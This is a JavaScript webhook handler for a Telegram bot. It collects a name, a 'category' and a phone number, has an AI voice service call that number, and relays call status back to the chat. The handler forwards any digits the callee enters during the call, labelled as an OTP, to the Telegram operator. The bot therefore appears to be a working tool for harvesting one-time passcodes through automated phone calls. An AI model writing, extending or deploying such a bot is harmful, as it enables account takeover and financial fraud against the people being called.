import TelegramBot from "node-telegram-bot-api";
import mongoose from "mongoose";
import axios from "axios";

export const config = {
  api: {
    bodyParser: true,
  },
};

// ================= DB CACHE =================

let cached = global.mongo;

if (!cached) {
  cached = global.mongo = { conn: null, promise: null };
}

async function connectDB() {
  if (cached.conn) return cached.conn;

  if (!cached.promise) {
    cached.promise = mongoose.connect(process.env.MONGO_URI, {
      bufferCommands: false,
    });
  }

  cached.conn = await cached.promise;
  return cached.conn;
}

// ================= BOT =================

let bot;

function getBot() {
  if (!bot) {
    bot = new TelegramBot(process.env.BOT_TOKEN, {
      polling: false,
    });
  }
  return bot;
}

// ================= MODEL =================

const User =
  mongoose.models.User ||
  mongoose.model("User", {
    chatId: String,
    titleName: String,
    category: String,
    phone: String,
    status: String,
    otp: String,
  });

// ================= CALL FUNCTION =================

async function callUser(user) {
  try {
    await axios.post(
      "https://api.ringg.ai/v1/calls",
      {
        phone: user.phone,
        assistant_id: "69c16290-66af-426c-832f-3681e482a88b",
        metadata: {
          name: user.titleName,
          category: user.category,
        },
        country_code: "AU",
      },
      {
        headers: {
          "X-API-KEY": process.env.RINGG_API_KEY,
          "Content-Type": "application/json",
        },
      }
    );

    console.log("Calling:", user.phone);
  } catch (err) {
    console.error("Ringg Call Error:", err.response?.data || err.message);
  }
}

// ================= HANDLER =================

export default async function handler(req, res) {
  try {
    if (req.method !== "POST") {
      return res.status(200).send("OK");
    }

    await connectDB();
    const bot = getBot();
    const body = req.body;

    // ================= TELEGRAM =================

    if (body?.message) {
      const chatId = body.message.chat.id;
      const text = body.message.text?.trim();

      if (!text) return res.status(200).send("OK");

      // ===== /START =====
      if (text === "/start") {
        await User.deleteOne({ chatId });

        const user = new User({
          chatId,
          status: "name",
        });

        await user.save();

        await bot.sendMessage(
          chatId,
`Welcome 👋

Please enter your title + name.

Example:
Mr Krishna
Mrs Karisma`
        );

        return res.status(200).send("OK");
      }

      const user = await User.findOne({ chatId });
      if (!user) return res.status(200).send("OK");

      // ===== NAME =====
      if (user.status === "name") {
        if (!text.match(/^(Mr|Mrs|Ms)\s/i)) {
          await bot.sendMessage(
            chatId,
            "❌ Please start with Mr / Mrs / Ms\nExample: Mr Krishna"
          );
          return res.status(200).send("OK");
        }

        user.titleName = text;
        user.status = "category";
        await user.save();

        await bot.sendMessage(
          chatId,
`Nice to meet you ${user.titleName} 😊

Enter your category:`
        );

        return res.status(200).send("OK");
      }

      // ===== CATEGORY =====
      if (user.status === "category") {
        user.category = text;
        user.status = "phone";
        await user.save();

        await bot.sendMessage(
          chatId,
`Send your phone number
(+CountryCodeNumber)`
        );

        return res.status(200).send("OK");
      }

      // ===== PHONE =====
      if (user.status === "phone") {
        if (!text.startsWith("+")) {
          await bot.sendMessage(
            chatId,
            "❌ Use international format\nExample: +614xxxxxxxx"
          );
          return res.status(200).send("OK");
        }

        user.phone = text;
        user.status = "calling";
        await user.save();

        await bot.sendMessage(chatId, "📞 Calling now...");
        await callUser(user);

        return res.status(200).send("OK");
      }

      // ===== OTP TELEGRAM =====
      if (user.status === "otp") {
        if (text === user.otp) {
          user.status = "verified";
          await user.save();

          await bot.sendMessage(
            chatId,
`✅ Verified!

Thank you ${user.titleName}.
Your request will be processed soon.
Have a nice day 🌟`
          );
        } else {
          await bot.sendMessage(chatId, "❌ Wrong OTP");
        }
      }

      return res.status(200).send("OK");
    }

    // ================= RINGG WEBHOOK =================

    if (body?.phone) {
      const { phone, step, intent, digits, status } = body;

      const user = await User.findOne({ phone });
      if (!user) return res.status(200).send("OK");

      if (status === "ringing") {
        await bot.sendMessage(user.chatId, "📞 Ringing...");
      }

      if (status === "picked") {
        await bot.sendMessage(user.chatId, "☎️ Call answered");
      }

      if (status === "ended") {
        await bot.sendMessage(user.chatId, "📴 Call ended");
      }

      if (step === "confirm_request" && intent === "no") {
        const otp = Math.floor(100000 + Math.random() * 900000).toString();

        user.otp = otp;
        user.status = "otp";
        await user.save();

        await bot.sendMessage(
          user.chatId,
`🔐 Verification Code: ${otp}

Enter it here in Telegram.`
        );
      }

      if (step === "otp_step" && digits) {
        await bot.sendMessage(
          user.chatId,
          `📲 OTP entered on call: ${digits}`
        );
      }

      return res.status(200).send("OK");
    }

    return res.status(200).send("OK");
  } catch (err) {
    console.error("Webhook Error:", err);
    return res.status(500).json({ error: err.message });
  }
}
